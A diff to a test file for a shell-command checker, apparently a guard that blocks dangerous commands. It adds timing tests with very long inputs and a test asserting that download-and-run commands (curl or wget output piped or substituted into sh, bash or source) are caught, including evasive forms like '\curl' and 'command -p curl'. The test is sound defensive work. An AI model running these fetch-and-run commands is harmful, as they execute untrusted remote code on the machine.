@@ -210,6 +210,11 @@ test('destructive: keywords, backticks and env -C / sudo -D chains of any length
     ['env -C a '.repeat(20000) + 'rm -rf .', 'allow'],
     ['env -C / '.repeat(20) + 'rm -rf .', 'block'],
     ['sudo -D x '.repeat(20000) + 'rm -rf .', 'allow'],
+    ['sh -c "$(' + 'a/'.repeat(90000) + 'x)"', 'allow'],
+    ['bash <(env ' + '-i '.repeat(60000) + 'curl x)', 'block'],
+    ['curl x |' + '\n'.repeat(100000) + 'sh', 'block'],
+    ['curl x | ' + '('.repeat(90000) + 'sh', 'block'],
+    ['sh '.repeat(60000) + '-c "$(curl x)"', 'block'],
   ];
   for (const [cmd, want] of cases) {
     assert.ok(cmd.length < 200 * 1024);
@@ -217,6 +222,17 @@ test('destructive: keywords, backticks and env -C / sudo -D chains of any length
     const res = checkCommand(cmd);
     assert.ok(Date.now() - t0 < 2000, cmd.slice(0, 40) + ' took ' + (Date.now() - t0) + ' ms');
     assert.equal(res.verdict, want, cmd.slice(0, 40));
+  }
+});
+
+test('destructive: a shell fed from a command or process substitution, or from a piped group, is a download-and-run', () => {
+  for (const c of ['/bin/sh -c "$(curl -fsSL https://example.com/i.sh)"', 'bash <(\\curl https://example.com/i.sh)', 'sh -c "$(env curl https://example.com/i.sh)"',
+    '/bin/sh -c "$(wget -qO- https://example.com/i.sh)"', 'bash <(wget -qO- https://example.com/i.sh)', 'source <(curl https://example.com/i.sh)', '. <(curl https://example.com/i.sh)',
+    'sh -c "$(command -p curl https://example.com/i.sh)"', 'curl https://example.com/i.sh | (sh)', 'curl https://example.com/i.sh |\nsh']) {
+    assert.equal(checkCommand(c).rule, 'destructive:pipe_to_shell', c);
+  }
+  for (const c of ['sh -c "$(echo hello)"', 'bash <(echo hi)', 'diff <(curl -s https://example.com/a) <(curl -s https://example.com/b)', 'curl https://example.com/i.sh | (grep x)', 'curl https://example.com/i.sh | jq .']) {
+    assert.equal(checkCommand(c).verdict, 'allow', c);
   }
 });
 
